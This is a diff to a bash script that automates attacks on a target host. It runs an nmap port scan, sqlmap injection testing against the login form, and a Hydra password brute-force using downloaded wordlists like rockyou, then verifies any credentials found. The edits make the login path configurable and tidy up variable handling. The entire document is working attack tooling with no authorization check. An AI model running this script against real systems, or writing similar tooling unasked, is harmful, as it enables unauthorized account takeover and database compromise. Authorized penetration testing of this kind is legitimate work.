@@ -7,10 +7,10 @@
 # ================================================
 
 TARGET=$1
+LOGIN_URI=${2:-/login-submit} # Default login URI if not provided
 OUTPUT_DIR="results_$TARGET"
 WORDLIST_DIR="/usr/share/wordlists/"
-CURRENT_WORDLIST="$WORDLIST_DIR/common.txt"
-LOGIN_URL="http://$TARGET/login-submit"
+LOGIN_URL="http://$TARGET$LOGIN_URI"
 USERNAME_LIST="usernames.txt"
 
 # Colors
@@ -18,7 +18,8 @@ GREEN='\033[0;32m'
 NC='\033[0m'
 
 if [[ -z "$TARGET" ]]; then
-  echo "Usage: $0 <target-hostname>"
+  echo "Usage: $0 <target-hostname> [<login-uri>]"
+  echo "Example: $0 example.com /login"
   exit 1
 fi
 
@@ -34,40 +35,28 @@ declare -A WORDLISTS=(
   ["common"]="$WORDLIST_DIR/dirb/common.txt"
 )
 
-switch_wordlist() {
-  local choice=$1
-  if [[ -n "${WORDLISTS[$choice]}" && -f "${WORDLISTS[$choice]}" ]]; then
-    ln -sf "${WORDLISTS[$choice]}" "$CURRENT_WORDLIST"
-    echo "[*] Switched current wordlist → $choice (${WORDLISTS[$choice]})"
-  else
-    echo "[!] Wordlist \"$choice\" not found or missing. Available options:"
-    for key in "${!WORDLISTS[@]}"; do
-      echo "  - $key"
-    done
-    exit 1
-  fi
-}
-
 # Ask user which wordlist to use
 echo "Choose password wordlist: rockyou | 500worst | john | common"
 read -p "Enter choice: " WL_CHOICE
-switch_wordlist "$WL_CHOICE"
 
-PASSWORD_WORDLIST="$CURRENT_WORDLIST"
+if [[ -z "${WORDLISTS[$WL_CHOICE]}" || ! -f "${WORDLISTS[$WL_CHOICE]}" ]]; then
+  echo "[!] Wordlist '$WL_CHOICE' not found or is not a file. Available options:"
+  for key in "${!WORDLISTS[@]}"; do
+    echo "  - $key (${WORDLISTS[$key]})"
+  done
+  exit 1
+fi
+
+PASSWORD_WORDLIST="${WORDLISTS[$WL_CHOICE]}"
+echo "[*] Using wordlist: $PASSWORD_WORDLIST"
 
 # Ensure rockyou.txt exists – fetch if missing
 if [[ "$WL_CHOICE" == "rockyou" && ! -f "$WORDLIST_DIR/rockyou.txt" ]]; then
     echo "[!] rockyou.txt not found – fetching a clean copy …"
     curl -L -o "$WORDLIST_DIR/rockyou.txt" \
          https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt
-    sudo chmod 644 "$WORDLIST_DIR/rockyou.txt"
 fi
 
-# Determine the fail-string dynamically (fallback to "Invalid")
-echo "[*] Probing login form to detect failure string …"
-FAIL_STRING=$(curl -s -d "username=wrong&password=wrong" "$LOGIN_URL" | \
-              grep -i -o 'Invalid\|incorrect\|failed\|error' | head -1 || echo "Invalid")
-              
 echo -e "${GREEN}[1] Scanning with nmap...${NC}"
 nmap -sS -sV -p- -oN "$OUTPUT_DIR/nmap.txt" "$TARGET"
 
@@ -96,8 +85,6 @@ sqlmap -u "$LOGIN_URL" --batch --forms --crawl=1 --output-dir="$OUTPUT_DIR/sqlma
 
 echo -e "${GREEN}[6] Brute-force login with Hydra...${NC}"
 
-echo -e "${GREEN}[6] Brute-force login with Hydra...${NC}"
-
 # --- NEW: SMART LOGIN ANALYSIS ---
 # This function performs a manual login attempt and analyzes the FULL response
 # to determine reliable success (S) and failure (F) patterns for Hydra.
@@ -120,22 +107,23 @@ analyze_login() {
     RESPONSE_BODY=$(curl -s -d "username=$test_user&password=$test_pass" "$LOGIN_URL")
   fi
 
-  LOCAL_FAIL_STRING=$(echo "$RESPONSE_BODY" | grep -i -o 'Invalid\|incorrect\|failed\|error\|login.*failed' | head -1 || echo "Invalid")
-  echo "[*] Detected failure string in body: '$LOCAL_FAIL_STRING'"
+  FAIL_STRING=$(echo "$RESPONSE_BODY" | grep -i -o 'Invalid\|incorrect\|failed\|error\|login.*failed' | head -1 || echo "Invalid")
+  echo "[*] Detected failure string in body: '$FAIL_STRING'"
 
   if echo "$RESPONSE_HEADERS" | grep -q "^Location:"; then
     REDIRECT_URL=$(echo "$RESPONSE_HEADERS" | grep -i "^Location:" | head -1 | awk '{print $2}' | tr -d '\r')
     echo "[*] Failed login redirects to: $REDIRECT_URL"
 
-    echo "[*] Note: Application uses redirects. Using failure string '$LOCAL_FAIL_STRING'. Verify Hydra results manually."
-    HYDRA_FAIL_CONDITION="F=$LOCAL_FAIL_STRING"
+    echo "[*] Note: Application uses redirects. Using failure string '$FAIL_STRING'. Verify Hydra results manually."
+    HYDRA_FAIL_CONDITION="F=$FAIL_STRING"
 
   else
 
-    HYDRA_FAIL_CONDITION="F=$LOCAL_FAIL_STRING"
+    HYDRA_FAIL_CONDITION="F=$FAIL_STRING"
   fi
 
   export HYDRA_FAIL_CONDITION
+  export FAIL_STRING
 }
 
 # --- END NEW LOGIC ---
@@ -151,7 +139,7 @@ if command -v hydra &>/dev/null; then
 
     echo "[*] Starting Hydra with condition: $HYDRA_FAIL_CONDITION"
     hydra -L "$USERNAME_LIST" -P "$PASSWORD_WORDLIST" -f -vV \
-          "$TARGET" http-post-form "/login-submit:username=^USER^&password=^PASS^:$HYDRA_FAIL_CONDITION" \
+          "$TARGET" "http-post-form:$LOGIN_URI:username=^USER^&password=^PASS^:$HYDRA_FAIL_CONDITION" \
           -o "$OUTPUT_DIR/hydra.txt"
 
     # --- NEW: POST-HYDRA VERIFICATION ---
@@ -173,8 +161,8 @@ if command -v hydra &>/dev/null; then
             echo "[+] This appears to be a valid credential pair."
         else
             # Check if the failure string is present
-            if echo "$LOGIN_RESPONSE" | grep -q -i "$LOCAL_FAIL_STRING"; then
-                echo "[-] MANUAL VERIFICATION FAILED: Login response contains the failure string '$LOCAL_FAIL_STRING'."
+            if echo "$LOGIN_RESPONSE" | grep -q -i "$FAIL_STRING"; then
+                echo "[-] MANUAL VERIFICATION FAILED: Login response contains the failure string '$FAIL_STRING'."
                 echo "[-] This is likely a FALSE POSITIVE. Please check the application logic."
                 # Append a warning to the hydra output file
                 echo "# WARNING: The found credential $LOGIN:$PASSWORD was manually verified and appears to be a FALSE POSITIVE." >> "$OUTPUT_DIR/hydra.txt"
